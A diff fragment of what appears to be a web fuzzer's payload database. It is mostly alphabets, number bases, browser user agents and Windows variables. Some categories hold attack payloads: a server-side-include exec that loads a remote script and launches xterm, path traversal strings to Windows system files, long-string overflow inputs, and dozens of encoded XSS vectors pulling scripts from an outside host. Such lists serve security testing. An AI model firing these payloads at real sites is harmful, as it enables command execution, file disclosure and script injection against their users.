+<body/????$/onload=x={doc:parent[�document�]};x.doc.writeln(1)
+
+P:028-XSS-SSI:Server Side Includes:2
+> XSS | Replacive Fuzzers | Web Server
+>>This is a comment line to be changed in the future
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+<!--#exec cmd=""/usr/X11R6/bin/xterm ?display 127.0.0.1:0 &""-->
+
+P:029-PTH-SMF:Sample Files:2
+> Web Server | Replacive Fuzzers
+>>This is a comment line to be changed in the future
+/../.. /../../../boot.ini
+/../../../../../winnt/repair/setup.log
+
+P:030-XSS-BRK:URL Breaking:3
+> XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
+httP://aa"><script>alert(123)</script>
+httP://aa'><script>alert(123)</script>
+httP://aa<script>alert(123)</script>
+
+R:031-B16-HEX:Base16 (HEX):16
+> Number Systems | Base | Recursive Fuzzers
+>>This is a comment line to be changed in the future
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+a
+b
+c
+d
+e
+f
+
+R:032-B10-DEC:Base10 (DEC):10
+> Number Systems | Base | Recursive Fuzzers
+>>This is a comment line to be changed in the future
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+
+R:033-B08-OCT:Base08 (OCTAL):8
+> Number Systems | Base | Recursive Fuzzers
+>>This is a comment line to be changed in the future
+0
+1
+2
+3
+4
+5
+6
+7
+
+R:034-B02-BIN:Base02 (binary):2
+> Number Systems | Base | Recursive Fuzzers
+>>This is a comment line to be changed in the future
+0
+1
+
+R:035-B36-ALP:Alpha Numeric:36
+> Alphabets | Recursive Fuzzers 
+>>This is a comment line to be changed in the future
+a
+b
+c
+d
+e
+f
+g
+h
+i
+j
+k
+l
+m
+n
+o
+p
+q
+r
+s
+t
+u
+v
+w
+x
+y
+z
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+
+R:036-ALP-HAB:English Alphabet:26
+> Alphabets | Recursive Fuzzers
+>>This is a comment line to be changed in the future
+a
+b
+c
+d
+e
+f
+g
+h
+i
+j
+k
+l
+m
+n
+o
+p
+q
+r
+s
+t
+u
+v
+w
+x
+y
+z
+
+R:037-B64-RFC:Base64 Alphabet:64
+> Alphabets | Number Systems | Base | Recursive Fuzzers
+>>This is a comment line to be changed in the future
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+a
+b
+c
+d
+e
+f
+g
+h
+i
+j
+k
+l
+m
+n
+o
+p
+q
+r
+s
+t
+u
+v
+w
+x
+y
+z
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
++
+/
+=
+
+R:038-B64-URL:Base64 (URL/File Safe) Alphabet:64
+> Alphabets | Number Systems | Base | Recursive Fuzzers
+>>This is a comment line to be changed in the future
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+a
+b
+c
+d
+e
+f
+g
+h
+i
+j
+k
+l
+m
+n
+o
+p
+q
+r
+s
+t
+u
+v
+w
+x
+y
+z
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+-
+_
+=
+
+R:039-B32-RFC:Base32 Alphabet:32
+> Alphabets | Number Systems | Base | Recursive Fuzzers
+>>This is a comment line to be changed in the future
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+2
+3
+4
+5
+6
+7
+=
+
+R:040-B32-HEX:Base32 (Extended HEX) Alphabet:32
+> Alphabets | Number Systems | Base | Recursive Fuzzers
+>>This is a comment line to be changed in the future
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+=
+
+P:041-BFO-EXP:Long Strings of aaa's:17
+> Exploits | Buffer Overflows
+>>This is a comment line to be changed in the future
+a
+f(x)=a x 3
+f(x)=a x 5
+f(x)=a x 9
+f(x)=a x 17
+f(x)=a x 33
+f(x)=a x 65
+f(x)=a x 129
+f(x)=a x 257
+f(x)=a x 513
+f(x)=a x 1025
+f(x)=a x 2049
+f(x)=a x 4197
+f(x)=a x 8193
+f(x)=a x 16385
+f(x)=a x 32769
+f(x)=a x 65537
+
+R:042-DNA-ALP:DNA Fuzzer:4
+> Biology | Alphabets
+>>This is a comment line to be changed in the future
+a
+t
+c
+g
+
+P:043-XSS-AXL:MS Anti-XSS lib_v3.0:78
+> XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
+&#60;SCRIPT&#62;alert&#40;&#39;XSS&#39;&#41;&#60;&#47;SCRIPT&#62;
+&#60;SCRIPT SRC&#61;http&#58;&#47;&#47;testsite.com&#47;xss.js&#62;&#60;&#47;SCRIPT&#62;
+&#60;SCRIPT&#62;alert&#40;String.fromCharCode&#40;88,83,83&#41;&#41;&#60;&#47;SCRIPT&#62;
+&#60;BASE HREF&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#47;&#47;&#34;&#62;
+&#60;BGSOUND SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;BODY BACKGROUND&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;BODY ONLOAD&#61;alert&#40;&#39;XSS&#39;&#41;&#62;
+&#60;DIV STYLE&#61;&#34;background-image&#58; url&#40;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#41;&#34;&#62;
+&#60;DIV STYLE&#61;&#34;background-image&#58; url&#40;&#38;&#35;1&#59;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#41;&#34;&#62;
+&#60;DIV STYLE&#61;&#34;width&#58; expression&#40;alert&#40;&#39;XSS&#39;&#41;&#41;&#59;&#34;&#62;
+&#60;FRAMESET&#62;&#60;FRAME SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;&#60;&#47;FRAMESET&#62;
+&#60;IFRAME SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;&#60;&#47;IFRAME&#62;
+&#60;INPUT TYPE&#61;&#34;IMAGE&#34; SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;IMG SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;IMG SRC&#61;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#62;
+&#60;IMG DYNSRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;IMG LOWSRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;IMG SRC&#61;&#34;http&#58;&#47;&#47;www.thesiteyouareon.com&#47;somecommand.php&#63;somevariables&#61;maliciouscode&#34;&#62;
+&#60;STYLE&#62;li &#123;list-style-image&#58; url&#40;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;&#41;&#59;&#125;&#60;&#47;STYLE&#62;&#60;UL&#62;&#60;LI&#62;XSS
+&#60;IMG SRC&#61;&#39;vbscript&#58;msgbox&#40;&#34;XSS&#34;&#41;&#39;&#62;
+&#60;LAYER SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;scriptlet.html&#34;&#62;&#60;&#47;LAYER&#62;
+&#60;IMG SRC&#61;&#34;livescript&#58;&#91;code&#93;&#34;&#62;
+&#37;BCscript&#37;BEalert&#40;&#37;A2XSS&#37;A2&#41;&#37;BC&#47;script&#37;BE
+&#60;META HTTP-EQUIV&#61;&#34;refresh&#34; CONTENT&#61;&#34;0&#59;url&#61;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;META HTTP-EQUIV&#61;&#34;refresh&#34; CONTENT&#61;&#34;0&#59;url&#61;data&#58;text&#47;html&#59;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&#34;&#62;
+&#60;META HTTP-EQUIV&#61;&#34;refresh&#34; CONTENT&#61;&#34;0&#59; URL&#61;http&#58;&#47;&#47;&#59;URL&#61;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;IMG SRC&#61;&#34;mocha&#58;&#91;code&#93;&#34;&#62;
+&#60;STYLE TYPE&#61;&#34;text&#47;javascript&#34;&#62;alert&#40;&#39;XSS&#39;&#41;&#59;&#60;&#47;STYLE&#62;
+&#60;IMG STYLE&#61;&#34;xss&#58;expr&#47;&#42;XSS&#42;&#47;ession&#40;alert&#40;&#39;XSS&#39;&#41;&#41;&#34;&#62;
+&#60;XSS STYLE&#61;&#34;xss&#58;expression&#40;alert&#40;&#39;XSS&#39;&#41;&#41;&#34;&#62;
+&#60;STYLE&#62;.XSS&#123;background-image&#58;url&#40;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;&#41;&#59;&#125;&#60;&#47;STYLE&#62;&#60;A CLASS&#61;XSS&#62;&#60;&#47;A&#62;
+&#60;STYLE type&#61;&#34;text&#47;css&#34;&#62;BODY&#123;background&#58;url&#40;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;&#41;&#125;&#60;&#47;STYLE&#62;
+&#60;LINK REL&#61;&#34;stylesheet&#34; HREF&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;LINK REL&#61;&#34;stylesheet&#34; HREF&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.css&#34;&#62;
+&#60;STYLE&#62;&#64;import&#39;http&#58;&#47;&#47;testsite.com&#47;xss.css&#39;&#59;&#60;&#47;STYLE&#62;
+&#60;META HTTP-EQUIV&#61;&#34;Link&#34; Content&#61;&#34;&#60;http&#58;&#47;&#47;testsite.com&#47;xss.css&#62;&#59; REL&#61;stylesheet&#34;&#62;
+&#60;STYLE&#62;BODY&#123;-moz-binding&#58;url&#40;&#34;http&#58;&#47;&#47;testsite.com&#47;xssmoz.xml&#35;xss&#34;&#41;&#125;&#60;&#47;STYLE&#62;
+&#60;TABLE BACKGROUND&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;&#62;&#60;&#47;TABLE&#62;
+&#60;TABLE&#62;&#60;TD BACKGROUND&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;&#62;&#60;&#47;TD&#62;&#60;&#47;TABLE&#62;
+&#60;HTML xmlns&#58;xss&#62; &#60;&#63;import namespace&#61;&#34;xss&#34; implementation&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.htc&#34;&#62; &#60;xss&#58;xss&#62;XSS&#60;&#47;xss&#58;xss&#62; &#60;&#47;HTML&#62;
+&#60;XML ID&#61;I&#62;&#60;X&#62;&#60;C&#62;&#60;&#33;&#91;CDATA&#91;&#60;IMG SRC&#61;&#34;javas&#93;&#93;&#62;&#60;&#33;&#91;CDATA&#91;cript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;&#93;&#93;&#62; &#60;&#47;C&#62;&#60;&#47;X&#62;&#60;&#47;xml&#62;&#60;SPAN DATASRC&#61;&#35;I DATAFLD&#61;C DATAFORMATAS&#61;HTML&#62;
+&#60;XML ID&#61;&#34;xss&#34;&#62;&#60;I&#62;&#60;B&#62;&#60;IMG SRC&#61;&#34;javas&#60;&#33;-- --&#62;cript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;&#62;&#60;&#47;B&#62;&#60;&#47;I&#62;&#60;&#47;XML&#62; &#60;SPAN DATASRC&#61;&#34;&#35;xss&#34; DATAFLD&#61;&#34;B&#34; DATAFORMATAS&#61;&#34;HTML&#34;&#62;&#60;&#47;SPAN&#62;
+&#60;XML SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xsstest.xml&#34; ID&#61;I&#62;&#60;&#47;XML&#62; &#60;SPAN DATASRC&#61;&#35;I DATAFLD&#61;C DATAFORMATAS&#61;HTML&#62;&#60;&#47;SPAN&#62;
+&#60;&#33;--&#91;if gte IE 4&#93;&#62; &#60;SCRIPT&#62;alert&#40;&#39;XSS&#39;&#41;&#59;&#60;&#47;SCRIPT&#62; &#60;&#33;&#91;endif&#93;--&#62;
+&#60;META HTTP-EQUIV&#61;&#34;Set-Cookie&#34; Content&#61;&#34;USERID&#61;&#60;SCRIPT&#62;alert&#40;&#39;XSS&#39;&#41;&#60;&#47;SCRIPT&#62;&#34;&#62;
+&#60;XSS STYLE&#61;&#34;behavior&#58; url&#40;http&#58;&#47;&#47;testsite.com&#47;xss.htc&#41;&#59;&#34;&#62;
+&#60;SCRIPT SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.jpg&#34;&#62;&#60;&#47;SCRIPT&#62;
+&#60;BR SIZE&#61;&#34;&#38;&#123;alert&#40;&#39;XSS&#39;&#41;&#125;&#34;&#62;
+&#60;IMG SRC&#61;JaVaScRiPt&#58;alert&#40;&#39;XSS&#39;&#41;&#62;
+&#60;IMG SRC&#61;javascript&#58;alert&#40;&#38;quot&#59;XSS&#38;quot&#59;&#41;&#62;
+&#60;IMG SRC&#61;javascript&#58;alert&#40;String.fromCharCode&#40;88,83,83&#41;&#41;&#62;
+&#60;&#47;TITLE&#62;&#60;SCRIPT&#62;alert&#40;&#34;XSS&#34;&#41;&#59;&#60;&#47;SCRIPT&#62;
+&#60;STYLE&#62;&#64;im&#92;port&#39;&#92;ja&#92;vasc&#92;ript&#58;alert&#40;&#34;XSS&#34;&#41;&#39;&#59;&#60;&#47;STYLE&#62;
+&#60;IMG SRC&#61;&#34;jav ascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;IMG SRC&#61;&#34;jav&#38;&#35;x09&#59;ascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;IMG SRC&#61;&#34;jav&#38;&#35;x0A&#59;ascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;IMG SRC&#61;&#34;jav&#38;&#35;x0D&#59;ascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;IMG SRC &#61; &#34; j a v a s c r i p t &#58; a l e r t &#40; &#39; X S S &#39; &#41; &#34; &#62;
+perl -e &#39;print &#34;&#60;IMG SRC&#61;java&#92;0script&#58;alert&#40;&#34;XSS&#34;&#41;&#62;&#34;&#59;&#39;&#62; out
+perl -e &#39;print &#34;&#38;&#60;SCR&#92;0IPT&#62;alert&#40;&#34;XSS&#34;&#41;&#60;&#47;SCR&#92;0IPT&#62;&#34;&#59;&#39; &#62; out
+&#60;IMG SRC&#61;&#34; &#38;&#35;14&#59; javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
+&#60;SCRIPT&#47;XSS SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;
+&#60;BODY onload&#33;&#35;&#36;&#37;&#38;&#40;&#41;&#42;&#126;&#43;-_.,&#58;&#59;&#63;&#64;&#91;&#47;&#124;&#92;&#93;&#94;&#96;&#61;alert&#40;&#34;XSS&#34;&#41;&#62;
+&#60;SCRIPT SRC&#61;http&#58;&#47;&#47;testsite.com&#47;xss.js
+&#60;SCRIPT SRC&#61;&#47;&#47;testsite.com&#47;.j&#62;
+&#60;IMG SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;
+&#60;IFRAME SRC&#61;http&#58;&#47;&#47;testsite.com&#47;scriptlet.html &#60;
+&#60;&#60;SCRIPT&#62;alert&#40;&#34;XSS&#34;&#41;&#59;&#47;&#47;&#60;&#60;&#47;SCRIPT&#62;
+&#60;IMG &#34;&#34;&#34;&#62;&#60;SCRIPT&#62;alert&#40;&#34;XSS&#34;&#41;&#60;&#47;SCRIPT&#62;&#34;&#62;
+&#60;SCRIPT&#62;a&#61;&#47;XSS&#47; alert&#40;a.source&#41;&#60;&#47;SCRIPT&#62;
+&#60;P STYLE&#61;&#34;behavior&#58;url&#40;&#39;&#35;default&#35;time2&#39;&#41;&#34; onEnd&#61;&#34;alert&#40;&#39;XSS&#39;&#41;&#34;&#62;
+&#60;SCRIPT a&#61;&#34;&#62;&#34; SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;
+&#60;SCRIPT &#61;&#34;blah&#34; SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;
+&#60;SCRIPT a&#61;&#34;blah&#34; &#39;&#39; SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;
+&#60;SCRIPT &#34;a&#61;&#39;&#62;&#39;&#34; SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;
+&#60;SCRIPT a&#61;&#96;&#62;&#96; SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;
+&#60;SCRIPT&#62;document.write&#40;&#34;&#60;SCRI&#34;&#41;&#59;&#60;&#47;SCRIPT&#62;PT SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;
+&#60;SCRIPT a&#61;&#34;&#62;&#39;&#62;&#34; SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;
+
+P:044-USR-AGN:All User Agents:29
+> HTTP | Replacive Fuzzers | User Agents | Headers
+>> Impersonate different browsers and operating systems by modifying the User-Agent header field
+User-Agent: Mozilla/1.22 (compatible; MSIE 2.0d; Windows NT)
+User-Agent: Mozilla/2.0 (compatible; MSIE 3.02; Update a; Windows NT)
+User-Agent: Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0)
+User-Agent: Mozilla/4.79 [en] (WinNT; U)
+User-Agent: Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:0.9.2) Gecko/20010726 Netscape6/6.1
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14
+User-Agent: Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE90-1/210.34.75 Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413
+User-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5G77 Safari/525.20
+User-Agent: Mozilla/5.0 (Linux; U; Android 1.5; en-gb; HTC Magic Build/CRB17) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1
+User-Agent: Opera/9.27 (Windows NT 5.1; U; en)
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.4.154.25 Safari/525.19
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.48 Safari/525.19
+User-Agent: Wget/1.8.2
+User-Agent: Mozilla/5.0 (PLAYSTATION 3; 1.00)
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; (R1 1.6))
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 (.NET CLR 3.5.30729) JBroFuzz/1.4
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20050923 CentOS/1.0.7-1.4.1.centos4 Firefox/1.0.7
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727)
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5
+User-Agent: Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.7) Gecko/20070606
+User-Agent: Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.14) Gecko/20080520 Firefox/2.0.0.14
+User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5
+
+R:045-A85-RFC:ASCII 85 Alphabet:85
+> Alphabets | Number Systems | Base | Recursive Fuzzers
+>> RFC 1924: Published on April 1, 1996, presumably not meant to be taken too seriously
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+a
+b
+c
+d
+e
+f
+g
+h
+i
+j
+k
+l
+m
+n
+o
+p
+q
+r
+s
+t
+u
+v
+w
+x
+y
+z
+!
+#
+$
+%
+&
+(
+)
+*
++
+-
+;
+<
+=
+>
+?
+@
+^
+_
+`
+{
+|
+}
+~
+.
+
+R:046-A94-CHR:ASCII 94 Alphabet:94
+> Alphabets | Number Systems | Base | Recursive Fuzzers
+>> The 94 (95 minus one, the space) printable ASCII characters, numbered from 33 to 126 (decimal)
+!
+"
+#
+$
+%
+&
+'
+(
+)
+*
++
+,
+-
+.
+/
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+:
+;
+<
+=
+>
+?
+@
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+[
+\
+]
+^
+_
+`
+a
+b
+c
+d
+e
+f
+g
+h
+i
+j
+k
+l
+m
+n
+o
+p
+q
+r
+s
+t
+u
+v
+w
+x
+y
+z
+{
+|
+}
+~
+
+R:047-A95-CHR:ASCII 95 Alphabet:95
+> Alphabets | Number Systems | Base | Recursive Fuzzers
+>> The 95 printable ASCII characters, numbered from 32 to 126 (decimal)
+ 
+!
+"
+#
+$
+%
+&
+'
+(
+)
+*
++
+,
+-
+.
+/
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+:
+;
+<
+=
+>
+?
+@
+A
+B
+C
+D
+E
+F
+G
+H
+I
+J
+K
+L
+M
+N
+O
+P
+Q
+R
+S
+T
+U
+V
+W
+X
+Y
+Z
+[
+\
+]
+^
+_
+`
+a
+b
+c
+d
+e
+f
+g
+h
+i
+j
+k
+l
+m
+n
+o
+p
+q
+r
+s
+t
+u
+v
+w
+x
+y
+z
+{
+|
+}
+~
+
+P:048-WIN-VAR:Windows Environment Variables:26
+> O/S Variables | Replacive Fuzzers
+>> XP, Vista, 7 Special variable aliases or placeholders for basic system properties
+%ALLUSERSPROFILE%
+%APPDATA%
+%COMPUTERNAME%
+%COMSPEC%
+%HOMEDRIVE%
+%HOMEPATH%
+%PATH%
+%PATHEXT%
+%PROGRAMFILES%
+%PROMPT%
+%SYSTEMDRIVE%
+%SYSTEMROOT%
+%TEMP%
+%TMP%
+%USERNAME%
+%USERPROFILE%
+%WINDIR%
+%DATE%
+%TIME%
+%CD%
+%ERRORLEVEL%
+%RANDOM%
+%CommonProgramFiles%
+%LOCALAPPDATA%
+%ProgramData%
+%Public%
